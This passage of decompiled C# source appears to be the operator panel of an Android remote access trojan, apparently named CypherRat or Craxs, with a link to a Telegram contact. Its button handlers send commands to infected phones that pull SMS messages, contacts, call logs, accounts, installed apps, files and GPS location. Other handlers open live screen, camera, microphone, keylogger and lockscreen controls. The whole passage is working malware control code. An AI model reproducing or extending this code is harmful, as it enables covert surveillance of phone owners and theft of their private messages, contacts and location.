			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void updaterows(object[] objs)
	{
		if (base.InvokeRequired)
		{
			updateuiD method = updaterows;
			Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			Client client = (Client)objs[0];
			DataGridViewRow dataGridViewRow = (DataGridViewRow)objs[1];
			try
			{
				if (dataGridViewRow == null)
				{
					return;
				}
				if ((client.Statistics == null) | (Operators.CompareString(client.Statistics, "null", TextCompare: false) == 0))
				{
					dataGridViewRow.Cells[15].Value = "Bing...";
				}
				else
				{
					dataGridViewRow.Cells[15].Value = client.Statistics;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			dataGridViewRow.Cells[12].Value = client.ActiveNow;
			dataGridViewRow.Cells[1].Value = client.Wallpaper;
			dataGridViewRow.Cells[0].Value = reso.GetScreen(client.Screen);
			dataGridViewRow.Cells[10].Value = reso.GetBattery(client.Battery);
			dataGridViewRow.Cells[11].Value = client.Wifi;
			if (client.isnewcall)
			{
				dataGridViewRow.Cells[9].Value = Resources.new_call;
			}
			if (client.isnewnotifi)
			{
				dataGridViewRow.Cells[8].Value = Resources.new_notifi;
			}
			if (client.IsAdminActive)
			{
				dataGridViewRow.Cells[14].Value = reso.CheckAdmin(client.IsAdminActive);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void CypherRat_Activated(object sender, EventArgs e)
	{
		try
		{
			isactive = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		if (A == null)
		{
			A = new CraxsAbout();
			DialogResult dialogResult = A.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				A.Close();
				A = null;
			}
			else
			{
				A.Close();
				A = null;
			}
		}
	}

	private void Filebtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							object[] parametersObjects = new object[4]
							{
								client.myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Smsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Contactbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Applicationsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Accountbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Callsbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Screenbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Live_Screen_" + client.ClientRemoteAddress;
						ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
						if (screenShoter == null)
						{
							screenShoter = new ScreenShoter();
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
							screenShoter.Tag = client.ClientRemoteAddress;
							screenShoter.classClient = client;
							screenShoter.Client = client.myClient;
							screenShoter.DownloadsFolder = client.FolderUSER;
							screenShoter.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Screenreadbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "SC_Readv2_" + client.ClientAddressIP;
						ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
						if (screenReaderV == null)
						{
							screenReaderV = new ScreenReaderV2();
							screenReaderV.Name = name;
							screenReaderV.Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP);
							screenReaderV.Tag = client.ClientRemoteAddress;
							screenReaderV.classClient = client;
							screenReaderV.Client = client.myClient;
							screenReaderV.DownloadsFolder = client.FolderUSER;
							screenReaderV.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Camerabtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					int num = 0;
					int num2 = 0;
					if (client.Isv4)
					{
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
					else
					{
						string name = "Camera_Manager_" + client.ClientRemoteAddress;
						CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
						if (cameraManager != null)
						{
							break;
						}
						cameraManager = new CameraManager();
						cameraManager.Name = name;
						cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
						cameraManager.classClient = client;
						if (cameraManager.classClient != null)
						{
							reso.Directory_Exist(cameraManager.classClient);
							cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
						}
						cameraManager.Client = client.myClient;
						cameraManager.classCamera = client;
						cameraManager.TempImage = new PictureBox();
						cameraManager.combotext.Visible = false;
						cameraManager.combosizes.Visible = false;
						cameraManager.Show();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Micbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
					{
						continue;
					}
					TcpClient myClient = client.myClient;
					string name = "Microphone_" + client.ClientRemoteAddress;
					Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
					if (microphone == null)
					{
						string[] array = client.Keys.Split(':');
						if (array.Length < infoServer.KeySize)
						{
							break;
						}
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Keyloggerbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						string name = "Keylogger_" + client.ClientRemoteAddress;
						Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
						if (client != null && keylogger == null)
						{
							keylogger = new Keylogger();
							keylogger.Name = name;
							keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
							keylogger.Client = client.myClient;
							keylogger.classClient = client;
							keylogger.DGV0.Columns[3].Width = 48;
							keylogger.DGV0.Columns[3].DisplayIndex = 0;
							keylogger.tmpAddressIP = client.ClientAddressIP;
							keylogger.tmpClientName = client.ClientName;
							keylogger.tmpCountry = client.Country;
							keylogger.tmpFolderUSER = client.FolderUSER;
							client.Keylogg = true;
							keylogger.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Locationbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Cells[8].Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Searchbtn_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count < 1)
		{
			CraxsAlert.Showinformation("No Clients Found");
			return;
		}
		if (string.IsNullOrEmpty(searchtext.Text))
		{
			CraxsAlert.Showinformation("Enter Text First");
			return;
		}
		checked
		{
			int num = ClientsWindow.Rows.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					Client client = (Client)ClientsWindow.Rows[i].Cells[8].Tag;
					if (searchbefore.Contains(client.Row) || !(client.ClientName.ToLower().Contains(searchtext.Text.ToLower()) | client.ClientAddressIP.ToLower().Contains(searchtext.Text.ToLower()) | client.Country.ToLower().Contains(searchtext.Text.ToLower()) | client.android.ToLower().Contains(searchtext.Text.ToLower()) | client.ClientName.ToLower().Contains(searchtext.Text.ToLower()) | client.ActiveNow.ToLower().Contains(searchtext.Text.ToLower())))
					{
						continue;
					}
					ClientsWindow.FirstDisplayedScrollingRowIndex = client.Row.Index;
					searchbefore.Add(client.Row);
					break;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void B_ok_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count > 0)
		{
			ClientsWindow.SelectedRows[0].Selected = false;
		}
	}

	private void TCbattertpic_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		try
		{
			if (ClientsWindow.Rows.Count > 0)
			{
				ClientsWindow.FirstDisplayedScrollingRowIndex = 0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Clientfoldrbtn_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				string folderUSER = ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).FolderUSER;
				if (!Directory.Exists(folderUSER))
				{
					Directory.CreateDirectory(folderUSER);
				}
				Process.Start(folderUSER);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).Blockme(((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).ClientAddressIP);
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).Close(((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				TcpClient myClient = ((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient;
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Information + Data.SPL_SOCKET + "information",
					Codes.Encoding().GetBytes("null"),
					(Client)ClientsWindow.SelectedRows[0].Cells[8].Tag
				};
				((Client)ClientsWindow.SelectedRows[0].Cells[8].Tag).SendMessage(parametersObjects);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		try
		{
			if (ClientsWindow.Rows.Count > 0)
			{
				ClientsWindow.FirstDisplayedScrollingRowIndex = ClientsWindow.Rows[checked(ClientsWindow.Rows.Count - 1)].Index;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		searchbefore.Clear();
		if (!string.IsNullOrEmpty(searchtext.Text))
		{
			clearsrchbtn.Visible = true;
		}
		else
		{
			clearsrchbtn.Visible = false;
		}
	}

	private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		smoothfadedout(this, 40);
	}

	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(VB_0024StateMachine_109_smoothfadedout))]
	private void smoothfadedout(Form targetform, int slowtime)
	{
		VB_0024StateMachine_109_smoothfadedout stateMachine = new VB_0024StateMachine_109_smoothfadedout();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_targetform = targetform;
		stateMachine._0024VB_0024Local_slowtime = slowtime;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void BlockClientToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGVblocked.Rows.Count <= 0 || DGVblocked.SelectedRows.Count <= 0)
		{
			return;
		}
		DataGridViewRow dataGridViewRow = DGVblocked.SelectedRows[0];
		if (dataGridViewRow == null)
		{
			return;
		}
		checked
		{
			int num = server.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString()))
					{
						server[i].Blocklist.Remove(dataGridViewRow.Cells[1].Value.ToString());
						Data.MainForm.DGVblocked.Rows.Remove(dataGridViewRow);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (DataLog.Rows.Count <= 0 || DataLog.SelectedRows.Count <= 0)
		{
			return;
		}
		DataGridViewRow dataGridViewRow = DataLog.SelectedRows[0];
		if (dataGridViewRow == null)
		{
			return;
		}
		checked
		{
			try
			{
				int num = server.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						if (!server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", "")))
						{
							server[i].Blocklist.Add(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", ""));
							Data.MainForm.DGVblocked.Rows.Add(GetFlagThisIp.ThisIp(dataGridViewRow.Cells[1].Value.ToString()), dataGridViewRow.Cells[1].Value.ToString());
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		searchtext.Text = "";
	}

	private void Mapupdater_Tick(object sender, EventArgs e)
	{
	}

	private void Mainbatteryico_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIImageButton1_Click(object sender, EventArgs e)
	{
	}

	private void Battarypic_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool HideCaret(IntPtr hWnd);

	private void targetCtext_GotFocus(object sender, EventArgs e)
	{
	}

	private void FilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							object[] parametersObjects = new object[4]
							{
								client.myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void SMSToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void CallsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ContactsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void AccountsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ApplicationsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public string formnames(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
